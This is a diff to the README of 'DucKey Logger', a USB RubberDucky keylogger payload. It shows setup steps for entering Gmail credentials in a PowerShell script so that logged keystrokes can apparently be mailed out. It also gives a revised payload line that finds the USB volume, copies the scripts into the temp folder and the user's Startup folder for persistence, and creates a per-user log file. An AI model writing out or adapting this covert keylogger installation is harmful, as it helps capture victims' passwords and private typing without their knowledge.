@@ -34,7 +34,7 @@ DucKey Logger is a USB RubberDucky payload that uses PowerShell to log keystroke
 
 ## Instructions:
 Set-Up/Installation
-1. change Gmail credentials in *c.cmd*
+1. change Gmail credentials in *p.ps1*
 ```powershell
 # gmail credentials
 $email = "example@gmail.com"
@@ -42,8 +42,8 @@ $password = "password"
 ```
 2. change name of the SD Card in *payload.txt*
 ```
-REM change 'L' do the name of your ducky
-STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\c.cmd "C:/Users/$($env:UserName)/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";exit
+REM change 'L' to the name of your ducky
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
 ```
 3. choose an option in *payload.txt*
 ```
